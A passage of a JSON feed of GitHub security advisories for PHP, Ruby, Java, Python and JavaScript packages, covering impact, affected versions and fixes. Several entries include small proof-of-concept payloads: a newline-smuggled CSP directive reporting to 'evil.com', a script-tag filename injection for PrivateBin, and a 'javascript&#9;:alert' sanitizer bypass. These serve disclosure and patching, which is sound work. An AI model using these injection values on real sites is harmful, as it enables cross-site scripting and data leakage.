validation could be possible but so far unidentified, we recommend updating the affected software as soon as possible.\n\n### Resolution\nUpgrade to the latest version.\n\n### Credit\nThis security issue was discovered and reported on December 3, 2016 by Thijs Kinkhorst.",
    "summary": "Incorrect signature verification in SimpleSAMLphp"
  },
  {
    "ghsaId": "GHSA-2r3v-q9x3-7g46",
    "publishedAt": "2020-01-24T21:27:16Z",
    "description": "### Background\nSeveral scripts part of SimpleSAMLphp display a web page with links obtained from the request parameters. This allows us to enhance usability, as the users are presented with links they can follow after completing a certain action, like logging out.\n\n### Description\nThe following scripts were not checking the URLs obtained via the HTTP request before displaying them as the target of links that the user may click on:\n\n- `www/logout.php`\n- `modules/core/www/no_cookie.php`\n\nThe issue allowed attackers to display links targeting a malicious website inside a trusted site running SimpleSAMLphp, due to the lack of security checks involving the `link_href` and `retryURL` HTTP parameters, respectively. The issue was resolved by including a verification of the URLs received in the request against a white list of websites specified in the `trusted.url.domains` configuration option.\n\n### Affected versions\nAll SimpleSAMLphp versions prior to 1.14.4.\n\n### Impact\nA remote attacker could craft a link pointing to a trusted website running SimpleSAMLphp, including a parameter pointing to a malicious website, and try to fool the victim into visiting that website by clicking on a link in the page presented by SimpleSAMLphp.\n\n### Resolution\nUpgrade to the latest version.\n\n### Credit\nThis security issue was discovered and reported by John Page (hyp3rlinx).",
    "summary": "Link injection in SimpleSAMLphp"
  },
  {
    "ghsaId": "GHSA-mj9p-v2r8-wf8w",
    "publishedAt": "2020-01-24T21:26:54Z",
    "description": "### Background\n\nSimpleSAMLphp allows users to report errors and failures to the system administrators via a web form. This web form gathers some contextual information automatically, but it also allows the user to provide their email address for follow-ups and a free-text explanation of what happened. Once submitted, the report is sent as an email to the administrative email address configured in the software.\n\n### Description\n\nThe `www/erroreport.php` script allows error reports to be submitted and sent to the system administrator. Starting with SimpleSAMLphp  1.18.0, a new `SimpleSAML\\Utils\\EMail` class was introduced to handle sending emails, implemented as a wrapper of an external dependency.\n\nThis new wrapper allows us to use Twig templates in order to create the email sent with an error report. Since Twig provides automatic escaping of variables, manual escaping of the free-text field in `www/errorreport.php` was removed to avoid double escaping. However, for those not using the new user interface yet, an email template is hardcoded into the class itself in plain PHP. Since no escaping is provided in this template, it is then possible to inject HTML inside the template by manually crafting the contents of the free-text field.\n\n### Affected versions\n\nSimpleSAMLphp versions 1.18.0 to 1.18.3, both inclusive.\n\n### Impact\n\nAn attacker may take advantage of this issue to manually craft a modified email sent via the error reporting mechanism, such as this email might trick a system administrator into performing an action, such as introducing their credentials into a phishing web site that resembles the original.\n\nRemote execution of javascript code is considered unfeasible since email clients do not run javascript present in emails, although there might be email clients which don't follow this rule, making the attack surface grow.\n\n### Resolution\n\nUpgrade the SimpleSAMLphp installation to version 1.18.4.\n\n### Credit\n\nThis vulnerability was discovered and reported by Frederic Vleminckx.",
    "summary": "Cross-site scripting in SimpleSAMLphp"
  },
  {
    "ghsaId": "GHSA-6gc6-m364-85ww",
    "publishedAt": "2020-01-24T21:26:13Z",
    "description": "### Background\n\nSimpleSAMLphp has a logging functionality that allows system administrators to keep track of the activity, errors, and statistics. Additionally, it allows users to report errors, shall they happen. An error report contains a report identifier, which is logged once submitted.\n\n### Description\n\nThe `www/erroreport.php` script, which receives error reports and sends them via email to the system administrator, didn't properly sanitize the report identifier obtained from the request. This allows an attacker, under specific circumstances, to inject new log lines by manually crafting this report ID.\n\nWhen configured to use the `file` logging handler, SimpleSAMLphp will output all its logs by appending each log line to a given file. Since the `reportID` parameter received in a request sent to `www/errorreport.php` was not properly sanitized, it was possible to inject newline characters into it, effectively allowing a malicious user to inject new log lines with arbitrary content.\n\n### Affected versions\n\nSimpleSAMLphp versions up to **1.18.3**.\n\n### Impact\n\nAn attacker may use this issue to inject logs messages into a SimpleSAMLphp log file, trying to trick or confuse system administrators. However, the attack surface is considered small, as the attack will only work with the `file` logging handler, which opens the log file in _append-only_ mode. This means an attacker cannot edit or remove existing log messages, and even if non-ascii characters are written to the log, the file will always be readable with a simple text editor.\n\n### Resolution\n\nUpgrade the SimpleSAMLphp installation to version **1.18.4**.\n\n### Credit\n\nThis vulnerability was discovered and reported by Frederic Vleminckx on January 23, 2020.",
    "summary": "Log injection in SimpleSAMLphp"
  },
  {
    "ghsaId": "GHSA-5fq8-3q2f-4m5g",
    "publishedAt": "2020-01-24T19:56:59Z",
    "description": "### Impact\nThe views provided by django-user-sessions allow users to terminate specific sessions. The session key is used to identify sessions, and thus included in the rendered HTML. In itself this is not a problem. However if the website has an XSS vulnerability, the session key could be extracted by the attacker and a session takeover could happen.\n\n### Patches\nPatch is under way.\n\n### Workarounds\nRemove the session_key from the template.\n\n### References\n_None._\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Bouke/django-user-sessions](https://github.com/Bouke/django-user-sessions/issues)\n* Email us at [bouke@haarsma.eu](mailto:bouke@haarsma.eu)",
    "summary": "Session key exposure through session list in Django User Sessions"
  },
  {
    "ghsaId": "GHSA-hxhm-96pp-2m43",
    "publishedAt": "2020-01-24T15:27:25Z",
    "description": "### Impact\n\nThe vulnerability, reported by GoSecure Inc, allows Remote Code Execution, if you call `expressions.compile(userControlledInput)` where `userControlledInput` is text that comes from user input.\n\n* If running angular-expressions in the browser, an attacker could run any browser script when the application code calls expressions.compile(userControlledInput).\n* If running angular-expressions on the server, an attacker could run any Javascript expression, thus gaining Remote Code Execution.\n\n### Patches\n\nUsers should upgrade to version 1.0.1 of angular-expressions\n\n### Workarounds\n\nA temporary workaround might be either to : \n\n* disable user-controlled input that will be fed into angular-expressions in your application\n\nOR\n\n* allow only following characters in the userControlledInput : \n\n```js\nif (/^[|a-zA-Z.0-9 :\"'+-?]+$/.test(userControlledInput)) {\n      var result = expressions.compile(userControlledInput);\n}\nelse {\n     result = undefined;\n}\n```\n\n### References\n\n[Removal of angular-expression sandbox](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [angular-expressions](https://github.com/peerigon/angular-expressions/issues)\n* [Email us](mailto:contact@javascript-ninja.fr)\n\n### Credits \n\nThe issue was reported by Maxime Nadeau from GoSecure, Inc.",
    "summary": "Remote Code Execution in Angular Expressions"
  },
  {
    "ghsaId": "GHSA-xq52-rv6w-397c",
    "publishedAt": "2020-01-23T02:28:11Z",
    "description": "### Impact\n\nIf user-supplied input was passed into `append/override_content_security_policy_directives`, a semicolon could be injected leading to directive injection.\n\nThis could be used to e.g. override a `script-src` directive. Duplicate directives are ignored and the first one wins. The directives in `secure_headers` are sorted alphabetically so they pretty much all come before `script-src`. A previously undefined directive would receive a value even if `SecureHeaders::OPT_OUT` was supplied.\n\nThe fixed versions will silently convert the semicolons to spaces and emit a deprecation warning when this happens. This will result in innocuous browser console messages if being exploited/accidentally used. In future releases, we will raise application errors resulting in 500s.\n\n> Duplicate script-src directives detected.  All but the first instance will be ignored.\n\nSee https://www.w3.org/TR/CSP3/#parse-serialized-policy\n\n> Note: In this case, the user agent SHOULD notify developers that a duplicate directive was ignored. A console warning might be appropriate, for example.\n\n### Patches\n\nDepending on what major version you are using, the fixed versions are 6.2.0, 5.1.0, 3.8.0.\n\n### Workarounds\n\nIf you are passing user input into the above methods, you could filter out the input:\n\n```ruby\noverride_content_security_policy_directives(:frame_src, [user_input.gsub(\";\", \" \")])\n```\n\n### References\n\nReported in https://github.com/twitter/secure_headers/issues/418\nhttps://www.w3.org/TR/CSP3/#parse-serialized-policy\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [this repo](https://github.com/twitter/secure_headers/issues/new)\n* DM @ndm on twitter ",
    "summary": "Directive injection when using dynamic overrides with user input"
  },
  {
    "ghsaId": "GHSA-w978-rmpf-qmwg",
    "publishedAt": "2020-01-23T02:27:53Z",
    "description": "### Impact\n\nIf user-supplied input was passed into append/override_content_security_policy_directives, a newline could be injected leading to limited header injection.\n\nUpon seeing a newline in the header, rails will silently create a new `Content-Security-Policy` header with the remaining value of the original string. It will continue to create new headers for each newline.\n\ne.g.\n\n```ruby\noverride_content_security_directives(script_src: ['mycdn.com', \"\\ninjected\\n\"])` \n```\n\nwould result in \n\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: injected\nContent-Security-Policy: rest-of-the-header\n```\n\nCSP supports multiple headers and all policies must be satisfied for execution to occur, but a malicious value that reports the current page is fairly trivial:\n\n```ruby\noverride_content_security_directives(script_src: [\"mycdn.com\", \"\\ndefault-src 'none'; report-uri evil.com\"]) \n```\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: default-src 'none'; report-uri evil.com\nContent-Security-Policy: rest-of-the-header\n```\n\n### Patches\n\nThis has been fixed in 6.3.0, 5.2.0, and 3.9.0\n\n### Workarounds\n\n```ruby\noverride_content_security_policy_directives(:frame_src, [user_input.gsub(\"\\n\", \" \")])\n```\n\n### References\n\nhttps://github.com/twitter/secure_headers/security/advisories/GHSA-xq52-rv6w-397c\n[The effect of multiple policies](https://www.w3.org/TR/CSP3/#multiple-policies)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [this repo](https://github.com/twitter/secure_headers/security/advisories/new)\n* DM us at @ndm on twitter",
    "summary": "Limited header injection when using dynamic overrides with user input in RubyGems secure_headers"
  },
  {
    "ghsaId": "GHSA-6x3v-rw2q-9gx7",
    "publishedAt": "2020-01-21T21:18:44Z",
    "description": "A flaw was found in Infinispan through version 9.4.14.Final. An improper implementation of the session fixation protection in the Spring Session integration can result in incorrect session handling.",
    "summary": "Improper implementation of the session fixation protection in Infinispan"
  },
  {
    "ghsaId": "GHSA-7pm4-g2qj-j85x",
    "publishedAt": "2020-01-21T20:59:33Z",
    "description": "Spring Framework, versions 5.2.x prior to 5.2.3 are vulnerable to CSRF attacks through CORS preflight requests that target Spring MVC (spring-webmvc module) or Spring WebFlux (spring-webflux module) endpoints. Only non-authenticated endpoints are vulnerable because preflight requests should not include credentials and therefore requests should fail authentication. However a notable exception to this are Chrome based browsers when using client certificates for authentication since Chrome sends TLS client certificates in CORS preflight requests in violation of spec requirements. No HTTP body can be sent or received as a result of this attack.",
    "summary": "CSRF attack via CORS preflight requests with Spring MVC or Spring WebFlux"
  },
  {
    "ghsaId": "GHSA-8wx2-9q48-vm9r",
    "publishedAt": "2020-01-21T20:59:09Z",
    "description": "In Spring Framework, versions 5.2.x prior to 5.2.3, versions 5.1.x prior to 5.1.13, and versions 5.0.x prior to 5.0.16, an application is vulnerable to a reflected file download (RFD) attack when it sets a \"Content-Disposition\" header in the response where the filename attribute is derived from user supplied input.",
    "summary": "RFD attack via Content-Disposition header sourced from request input by Spring MVC or Spring WebFlux Application"
  },
  {
    "ghsaId": "GHSA-5qcg-w2cc-xffw",
    "publishedAt": "2020-01-21T20:32:09Z",
    "description": "The validators package 0.12.2 through 0.12.5 for Python enters an infinite loop when validators.domain is called with a crafted domain string. This is fixed in 0.12.6.",
    "summary": "Uncontrolled resource consumption in validators Python package"
  },
  {
    "ghsaId": "GHSA-vfq6-hq5r-27r6",
    "publishedAt": "2020-01-16T22:35:12Z",
    "description": "Django before 1.11.27, 2.x before 2.2.9, and 3.x before 3.0.1 allows account takeover. A suitably crafted email address (that is equal to an existing user's email address after case transformation of Unicode characters) would allow an attacker to be sent a password reset token for the matched user account. (One mitigation in the new releases is to send password reset tokens only to the registered user email address.)",
    "summary": "Potential account hijack via password reset form in Django"
  },
  {
    "ghsaId": "GHSA-7fcj-pq9j-wh2r",
    "publishedAt": "2020-01-16T22:18:27Z",
    "description": "### Impact\n\nLocal Privilege Escalation in all Windows software frozen by PyInstaller in \"onefile\" mode.\n\nThe vulnerability is present only on Windows and in this particular case: If a **software frozen by PyInstaller in \"onefile\" mode** is launched by a (privileged) user who has **his/her \"TempPath\" resolving to a world writable directory**. This is the case e.g. if the software is launched as a service or as a scheduled task using a system account (in which case TempPath will default to C:\\Windows\\Temp).\n\nIn order to be exploitable the software has to be (re)started after the attacker has launched the exploit program. So for a service launched at startup, a service restart is needed (e.g. after a crash or an upgrade).\n\nWhile PyInstaller itself was not vulnerable, all Windows software frozen by PyInstaller in \"onefile\" mode is vulnerable.\n\nCVSSv3 score 7.0 (High)\nCVSSv3 vector CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H\n\nAffected\n- all Windows software frozen by PyInstaller in \"onefile\" mode\n\nNo affected\n- PyInstaller itself (except if frozen by PyInstaller in \"onefile\" mode on Windows)\n- software frozen in \"one*dir*\" mode\n- other platforms (GNU/Linux, OS X, BSD, etc.)\n\n### Patches\nThe problem is patched in commits 42a67148b3bdf9211fda8499fdc5b63acdd7e6cc (fixed code) and be948cf0954707671aa499da17b10c86b6fa5e5c (recompiled bootloaders). Users should upgrade to PyInstaller version 3.6 and rebuild their software.\n\n### Workarounds\nThere is no known workaround. Users using PyInstaller to freeze their Windows software using \"onefile\" mode should upgrade PyInstaller and rebuild their software.\n\n### Credits\nThis vulnerability was discovered and reported by Farid AYOUJIL (@faridtsl), David HA, Florent LE NIGER and Yann GASCUEL (@lnv42) from Alter Solutions (@AlterSolutions) and fixed in collaboration with\nHartmut Goebel (@htgoebel, maintainer of PyInstaller).\n\n### Funding Development\n\nPyInstaller is in urgent need of funding to make future security fixes happen, see <https://github.com/pyinstaller/pyinstaller/issues/4404> for details.",
    "summary": "Local Privilege Escalation in PyInstaller"
  },
  {
    "ghsaId": "GHSA-r5gm-4p5w-pq2p",
    "publishedAt": "2020-01-16T22:17:40Z",
    "description": "class.upload.php in verot.net class.upload before 1.0.3 and 2.x before 2.0.4, as used in the K2 extension for Joomla! and other products, omits .phar from the set of dangerous file extensions.",
    "summary": "Remote code execution in verot/class.upload.php"
  },
  {
    "ghsaId": "GHSA-jgjc-332c-8cmc",
    "publishedAt": "2020-01-16T21:56:15Z",
    "description": "An issue was discovered in phpMyAdmin before 4.9.2. A crafted database/table name can be used to trigger a SQL injection attack through the designer feature.",
    "summary": "SQL injection in phpMyAdmin"
  },
  {
    "ghsaId": "GHSA-8j72-p2wm-6738",
    "publishedAt": "2020-01-14T20:19:33Z",
    "description": "On 24th of December 2019 one of the [property based unit tests](https://github.com/PrivateBin/PrivateBin/blob/master/tst/README.md#property-based-unit-testing) reported a [failure](https://travis-ci.org/PrivateBin/PrivateBin/jobs/629180605#L782). Upon investigation, [@elrido](https://github.com/elrido) discovered that the failure was due to unescaped HTML, which allowed the user provided attachment file name to inject HTML under certain conditions leading to a persistent [Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerability. After committing an [initial fix](https://github.com/PrivateBin/PrivateBin/commit/8d0ac336d23cd8c98e71d5f21cdadcae9c8a26e6) to the master branch, the [issue was reported](https://github.com/PrivateBin/PrivateBin/issues/554) on 25th of December. Vulnerability write-up done by [@rugk](https://github.com/rugk) and [@elrido](https://github.com/elrido).  \nThe vulnerability has been fixed in [PrivateBin v1.3.2 & v1.2.2](https://privatebin.info/news/v1.3.2-v1.2.2-release.html). Admins are urged to upgrade to these versions to protect the affected users.\n\n## Affected versions\n\nAny PrivateBin version since 1.2.\n\n## Conditions\n\n* The configuration setting `fileupload` has to be enabled, as 1.3 displays an error when trying to open a paste with attachment.\n* The CSP header rules don't get applied. For example:\n  * They are unsupported or disabled in the visitors browser.\n  * They are filtered out by a some proxy server at the server or client side.\n  * The header is disabled/commented in the PHP-logic.\n  * The rules have been relaxed in the `cspheader` configuration setting.\n* A paste with a malicious filename is created.\n* A visitor of that paste clicks on the \"Clone\" button.\n\n## Proof of concept\n\nThe following method is just one possibility to exploit this issue and is provided as a proof of concept with steps to reproduce the issue. To avoid having to create an actual file with a rogue filename, one could use the [Python CLI client for PrivateBin](https://github.com/r4sas/PBinCLI/) and [edit line 56 in `format.py`](https://github.com/r4sas/PBinCLI/blob/682b47fbd3e24a8a53c3b484ba896a5dbc85cda2/pbincli/format.py#L56) as follows:\n\n```diff\n-        self._attachment_name = path_leaf(path)\n+        self._attachment_name = '<script>alert(\"☹️\");//<a'\n```\n\nThe paste then can be created on a vulnerable instance:\n\n```shell\n$ python pbincli/cli.py send -t \" \" -f /dev/null -s https://privatebin.net/\n```\n\nVisiting the created paste on a vulnerable instance, with `fileupload` enabled and the CSP header weakened or disabled, and clicking the clone button will insert the HTML unescaped. In the above example, a pop-up would appear, when the script is executed.\n\n## Impact\n\nOn a vulnerable site pastes with malicious filenames can be created and users visiting these could inadvertently trigger the code execution when they click the \"Clone\" button. They could be instigated to do so via social engineering, like a paste text suggesting to \"clone and share\" the paste in question.\n\nThe attached file itself doesn't have to be empty and could be an image or document that would still be displayed inline as usual. The execution of the script triggered by clicking on the \"Clone\" button may occur silently in the background without showing any noticeable signs in browser. It may for instance be used to track visitors, start drive-by-downloads or similar. While we focus on script injection here, as it is the easiest exploit vector, it has to be said that anything else can be injected like CSS, images, videos, although the default CSP will block inline CSS and images, e.g.\n\nOn first visit, the filename isn't visible and is properly escaped when inserted into the download attribute. Only when clicking the \"Download attachment\" link would open a file save dialog with an odd name pre-filled, although browsers will convert illegal characters into valid ones, so it may not be identical to the one provided. Only when the \"Clone\" button has been clicked and after the exploit has already been triggered, the filename gets displayed. Note that an attacker can of course prevent this indicator of compromise to be shown and e.g. change the displayed text or obfuscate the filename by starting it with something harmless, like `image.png`, before opening the HTML tag.\n\n### Impact restrictions\n\nThe impact is mitigated by the fact that the vulnerability is, as far as our investigation concluded, paste-specific, i.e. opening a vulnerable paste can only compromise this one paste and no other pastes.\n\nFurthermore, as stated before, the impact is mitigated by the fact that we deploy a strong [CSP](https://content-security-policy.com/) that, by default, does not allow inline JS or other potentially easy methods that would allow an easy exploitation of the vulnerability.  \nThat said, we have to make users aware, that there may always be tricks to bypass such a CSP and the simple injection of HTML tags, e.g. destroying, faking or somehow phishing an HTML page does always remain a possibility.\n\nAs such, we treat this as a security vulnerability with medium severity. It is critical on it's own, but we believe that the deployed security mechanisms should prevent an exploit in practice in most cases.\n\n## Real-life impact\n\nWe checked all instances listed in the [PrivateBin directory in the Wiki](https://github.com/PrivateBin/PrivateBin/wiki/PrivateBin-Directory) and didn't find any 1.1, 1.2 or 1.3 instances that had the CSP headers disabled or in a state we know to be vulnerable. We used the following script, that may be adapted to check the CSP headers of any single instance:\n\n```shell\nfor URL in $(\n    curl -s https://raw.githubusercontent.com/wiki/PrivateBin/PrivateBin/PrivateBin-Directory.md | grep -Po '^http.*?(?= )'\n)\ndo\n    echo -n \"$URL: \"\n    curl -sLI $URL | grep -Poi 'content-security-policy.*script-src.?\\K.*?(?=;)' || echo 'No CSP detected!'\ndone\n```\n\nSome of the above sites do offer file uploads. On these instances, it is still possible that a visitor could have CSP support disabled in their browser, i.e. via a transparent proxy at their internet uplink or due to a browser plugin or some other locally installed, misguided security solution.\n\n**Important:** This scan is only a cursory check and _must not_ be taken as a security analysis of any means! You are always responsible for the security of your own instance. Please do check it manually!\n\n## Mitigation\n\nAs server administrators can't detect if a paste contains file attachments at all (apart from their size) in version 1.3 and due to the encrypted filename in older versions, as well as the risk for clients that don't apply the CSP settings, we urge them to upgrade to versions 1.3.2 or 1.2.2.\n\nIf you use v1.3, you could disable the `fileupload` setting to prevent pastes from getting displayed that may contain this vulnerability. Note that this will break all existing pastes with uploads, however, so we do _not_ recommend this, but advise you to upgrade to a fixed version instead.\n\n## Further information\n\nWe want to make potential third-party client authors aware of this vulnerability and urge them to double-check their implementations. If they develop a client that displays untrusted foreign data from a paste in a HTML site, please make sure to escape it to prevent XSS attacks. Such attacks can only be prevented when the paste is displayed, a mitigation when a paste is created is pointless, as a different client can be used during creation.\n\nWe do also acknowledge and want to highlight the benefit of the CSP, which has first been [introduced in PrivateBin v1.0](https://github.com/PrivateBin/PrivateBin/issues/10).\n\nHowever, we want to make you again aware that a whitelist-based CSP as we use, may [sometimes still be bypassed](https://csp.withgoogle.com/docs/faq.html#problems-with-whitelists), e.g. if you host a copy of the Angular library on the same domain as your PrivateBin instance.\nWe are aware of that and [do consider](https://github.com/PrivateBin/PrivateBin/issues/108) upgrading to a stronger CSP in the future.\n\n### Issue discovery\n\nWhile it is satisfying that our hard work on introducing unit tests has payed off in the discovery and mitigation of this vulnerability, it does also show a limitation of unit testing. A third party doing a code review would have certainly focused on how the project handles user provided input and may have discovered this much quicker.\n\nThe discovery wasn't due to the unit test checking for HTML input to get properly escaped, on the contrary, the test assumed input would not be changed. So other instances of HTML tags generated would have happily passed the test. Only when the test generated a fragment of a link (`<a`) it failed, because the DOM silently removed it when it inserted the string, as links within links aren't allowed. While the test was written to throw arbitrary strings at the `AttachmentViewer.moveAttachmentTo()` method, the test would only check that these got inserted into the DOM unchanged, oblivious of their potential significance when interpreted as HTML.\n\nThe [test had been introduced](https://github.com/PrivateBin/PrivateBin/commit/39860dfdc434c00d18342b4fb3bc6f5d0960030d) on December 3rd, 2017, 570 commits ago. Every commit on master and in PRs since introduction in that commit triggers these tests to run for every supported PHP version. Additional test cycles get run on developers local environments during working on commits. Hence the test suite must have run a few thousand times, testing 100 random strings each time. And only after more then 2 years a string containing `<a` got generated, triggered the error condition and 22 shrinks later the smallest failing test case was presented as:\n\n```\nFailed after 65 tests and 22 shrinks. rngState: 8b8f0d4ec2a67139b5; Counterexample: \"image/png\"; \"\"; \"\\u0000\"; \"<a\"; \"\";\n```\n\nDiscussion about a potential problem with that code, [did spark last September](https://github.com/PrivateBin/PrivateBin/pull/508#commitcomment-34943221), when the vulnerable code part was changed to the one before before the current fix, but was [incorrectly judged](https://github.com/PrivateBin/PrivateBin/pull/508#commitcomment-34944396) as not being a problem, because all of our translation strings are hardcoded. The fact that we do actually add some untrusted user-provided content, wasn't considered at that point.\n\nIt should also be mentioned, that the coverage report released for version 1.3.1 did highlight the line that caused this vulnerability as not being covered during testing:\n\n![Coverage report for version 1.3.1 showing missing test coverage for line causing vulnerability]({static}/img/vulnerability-2020-01-11/coverage.png)\n\nSo, in conclusion, it is great to have all of these tools at our disposal, but the code quality would benefit a lot more from having more eyeballs and brains on it.\n\n## Timeline\n\n* 2019-12-24 – Property based unit test fails in a commit pushed to a PR.\n* 2019-12-25 – Issue investigated, preliminary patch and issue description published.\n* 2019-12-30 – Further investigations, proof-of-concept exploit demonstrated on a vulnerable test instance.\n* 2020-01-03 – Discussed broader mitigation of user provided content injections, reviewed other possible cases.\n* 2020-01-04 – Published a second patch based on review, escapes HTML in translation.\n* 2020-01-05 – Started writing vulnerability report.\n* 2020-01-07 – Backported fix for 1.2.1.\n* 2020-01-11 – [Release published](https://github.com/PrivateBin/PrivateBin/releases/tag/1.3.2).\n* 2020-01-11 – Vulnerability details published.",
    "summary": "Persistent XSS vulnerability in filename of attached file in PrivateBin"
  },
  {
    "ghsaId": "GHSA-v62j-fcxq-j239",
    "publishedAt": "2020-01-08T17:26:53Z",
    "description": "Apache Atlas versions 0.8.3 and 1.1.0 were found vulnerable to Stored Cross-Site Scripting in the search functionality",
    "summary": "Stored XSS in Apache Atlas"
  },
  {
    "ghsaId": "GHSA-gf8j-v8x5-h9qp",
    "publishedAt": "2020-01-08T17:15:37Z",
    "description": "enshrined/svg-sanitize before 0.12.0 mishandles script and data values in attributes, as demonstrated by unexpected whitespace such as in the javascript&#9;:alert substring.",
    "summary": "XSS in enshrined/svg-sanitize due to mishandled script and data values in attributes"
  },
  {
    "ghsaId": "GHSA-m8p2-495h-ccmh",
    "publishedAt": "2020-01-08T17:01:52Z",
    "description": "A vulnerability was found in Hibernate-Validator. The SafeHtml validator annotation fails to properly sanitize payloads consisting of potentially malicious code in HTML comments and instructions. This vulnerability can result in an XSS attack.",
    "summary": "The SafeHtml annotation in Hibernate-Validator does not properly guard against XSS attacks"
  },
  {
    "ghsaId": "GHSA-769f-539v-f5jg",
    "publishedAt": "2020-01-08T03:10:44Z",
    "description": "### Impact\n\nWe have identified that some gamification module ZIP archives have been built with phpunit dev dependencies. PHPUnit contains a php script that would allow, on a webserver, an attacker to perform a RCE.\n\nThis vulnerability impacts\n- phpunit before 4.8.28 and 5.x before 5.6.3 as reported in [CVE-2017-9841](https://nvd.nist.gov/vuln/detail/CVE-2017-9841)\n- phpunit >= 5.63 before 7.5.19 and 8.5.1 (this is a newly found vulnerability that is currently being submitted as a CVE after disclosure was provided to phpunit maintainers)\n\nYou can read PrestaShop official statement about this vulnerability [here](https://build.prestashop.com/news/critical-security-vulnerability-in-prestashop-modules/).\n\n### Patches\n\nIn the [security patch](https://github.com/PrestaShop/gamification/releases/tag/v2.3.2), we look for the unwanted vendor/phpunit folder and remove it if we find it. This allows users to fix the security issue when upgrading.\n\n### Workarounds\nUsers can also simply remove the unwanted vendor/phpunit folder.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2017-9841\n\n### For more information\nIf you have any questions or comments about this advisory, email us at security@prestashop.com",
    "summary": "PrestaShop gamification module ZIP archives were vulnerable from CVE-2017-9841"
  },
  {
    "ghsaId": "GHSA-wqq8-mqj9-697f",
    "publishedAt": "2020-01-08T03:10:30Z",
    "description": "### Impact\n\nWe have identified that some autoupgrade module ZIP archives have been built with phpunit dev dependencies. PHPUnit contains a php script that would allow, on a webserver, an attacker to perform a RCE.\n\nThis vulnerability impacts\n- phpunit before 4.8.28 and 5.x before 5.6.3 as reported in [CVE-2017-9841](https://nvd.nist.gov/vuln/detail/CVE-2017-9841)\n- phpunit >= 5.63 before 7.5.19 and 8.5.1 (this is a newly found vulnerability that is currently being submitted as a CVE after disclosure was provided to phpunit maintainers)\n\nYou can read PrestaShop official statement about this vulnerability [here](https://build.prestashop.com/news/critical-security-vulnerability-in-prestashop-modules/).\n\n### Patches\n\nIn the [security patch](https://github.com/PrestaShop/autoupgrade/releases/tag/v4.10.1), we look for the unwanted vendor/phpunit folder and remove it if we find it. This allows users to fix the security issue when upgrading.\n\n### Workarounds\nUsers can also simply remove the unwanted vendor/phpunit folder.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2017-9841\n\n### For more information\nIf you have any questions or comments about this advisory, email us at security@prestashop.com",
    "summary": "PrestaShop autoupgrade module ZIP archives were vulnerable from CVE-2017-9841"
  },
  {
    "ghsaId": "GHSA-f884-gm86-cg3q",
    "publishedAt": "2020-01-07T17:20:47Z",
    "description": "### Impact\n\nWe have identified that some ps_facetedsearch module ZIP archives have been built with phpunit dev dependencies. PHPUnit contains a php script that would allow, on a webserver, an attacker to perform a RCE.\n\nThis vulnerability impacts\n- phpunit before 4.8.28 and 5.x before 5.6.3 as reported in [CVE-2017-9841](https://nvd.nist.gov/vuln/detail/CVE-2017-9841)\n- phpunit >= 5.63 before 7.5.19 and 8.5.1 (this is a newly found vulnerability that is currently being submitted as a CVE after disclosure was provided to phpunit maintainers)\n\n### Patches\n\nIn the [security patch](https://github.com/PrestaShop/ps_facetedsearch/releases/tag/v3.4.1), we look for the unwanted vendor/phpunit folder and remove it if we find it. This allows users to fix the security issue when upgrading.\n\n### Workarounds\nUsers can also simply remove the unwanted vendor/phpunit folder.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2017-9841\n\n### For more information\nIf you have any questions or comments about this advisory, email us at security@prestashop.com",
    "summary": "PrestaShop module ps_facetedsearch might be vulnerable from CVE-2017-9841"
  },
  {
    "ghsaId": "GHSA-968f-66r5-5v74",
    "publishedAt": "2020-01-06T18:44:21Z",
    "description": "### Impact\n\nThe patches introduced to fix https://github.com/Pylons/waitress/security/advisories/GHSA-m5ff-3wj3-8ph4 were not complete and still would allow an attacker to smuggle requests/split a HTTP request with invalid data.\n\nThis updates the existing CVE with ID: CVE-2019-16789\n\n### Patches\n\nWaitress version 1.4.2 has been updated to now validate HTTP headers better to avoid the issue, completely fixing all known issues with whitespace.\n\n### Workarounds\n\nThere are no work-arounds, upgrading to Waitress 1.4.2 is highly recommended.\n\n### References\n\nSee https://github.com/Pylons/waitress/security/advisories/GHSA-m5ff-3wj3-8ph4 for more information on the security issue.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)\n* email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",
    "summary": "HTTP Request Smuggling in Waitress: Invalid whitespace characters in headers (Follow-up)"
  },
  {
    "ghsaId": "GHSA-92vm-wfm5-mxvv",
    "publishedAt": "2020-01-06T18:44:10Z",
    "description": "Node-cookie-signature before 1.0.4 is affected by a timing attack due to the type of comparison used.",
    "summary": "Timing attack in cookie-signature NPM package"
  },
  {
    "ghsaId": "GHSA-2qrg-x229-3v8q",
    "publishedAt": "2020-01-06T18:43:49Z",
    "description": "Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data. This affects Log4j versions up to 1.2 up to 1.2.17.",
    "summary": "Deserialization of Untrusted Data in Log4j"
  },
  {
    "ghsaId": "GHSA-fxph-q3j8-mv87",
    "publishedAt": "2020-01-06T18:43:38Z",
    "description": "In Apache Log4j 2.x before 2.8.2, when using the TCP socket server or UDP socket server to receive serialized log events from another application, a specially crafted binary payload can be sent that, when deserialized, can execute arbitrary code.",
    "summary": "Deserialization of Untrusted Data in Log4j"
  },
  {
    "ghsaId": "GHSA-h47j-hc6x-h3qq",
    "publishedAt": "2019-12-30T19:30:31Z",
